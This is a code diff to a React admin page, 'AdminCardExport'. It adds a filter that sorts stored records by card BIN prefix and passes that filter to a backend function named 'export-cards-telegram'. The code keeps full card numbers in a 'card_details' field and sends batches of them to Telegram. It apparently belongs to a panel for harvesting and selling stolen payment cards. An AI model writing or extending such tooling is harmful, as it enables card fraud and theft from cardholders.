@@ -55,6 +55,7 @@ interface ExportRecord {
 const AdminCardExport = () => {
   const [exportType, setExportType] = useState<ExportType>("all");
   const [searchUser, setSearchUser] = useState("");
+  const [searchBin, setSearchBin] = useState("");
   const [loading, setLoading] = useState(false);
   const [records, setRecords] = useState<ExportRecord[]>([]);
   const [totalCount, setTotalCount] = useState(0);
@@ -185,6 +186,13 @@ const AdminCardExport = () => {
         );
       }
 
+      if (searchBin.trim()) {
+        const binPrefix = searchBin.trim();
+        finalData = finalData.filter(
+          (r) => r.card_details?.startsWith(binPrefix)
+        );
+      }
+
       setRecords(finalData);
       setTotalCount(finalData.length);
       setExported(true);
@@ -239,7 +247,7 @@ const AdminCardExport = () => {
     setSending(true);
     try {
       const { data, error } = await supabase.functions.invoke("export-cards-telegram", {
-        body: { exportType, searchUser: searchUser.trim() },
+        body: { exportType, searchUser: searchUser.trim(), searchBin: searchBin.trim() },
       });
 
       if (error) throw error;
@@ -319,7 +327,7 @@ const AdminCardExport = () => {
         </div>
 
         {/* Filters */}
-        <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
           <div>
             <label className="text-sm font-medium mb-1.5 block">Export Type</label>
             <Select value={exportType} onValueChange={(v) => setExportType(v as ExportType)}>
@@ -360,6 +368,20 @@ const AdminCardExport = () => {
                 value={searchUser}
                 onChange={(e) => setSearchUser(e.target.value)}
                 className="pl-10 bg-secondary border-border"
+              />
+            </div>
+          </div>
+
+          <div>
+            <label className="text-sm font-medium mb-1.5 block">Filter by BIN</label>
+            <div className="relative">
+              <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
+              <Input
+                placeholder="BIN prefix (e.g. 424242)..."
+                value={searchBin}
+                onChange={(e) => setSearchBin(e.target.value.replace(/\D/g, "").slice(0, 8))}
+                className="pl-10 bg-secondary border-border"
+                maxLength={8}
               />
             </div>
           </div>
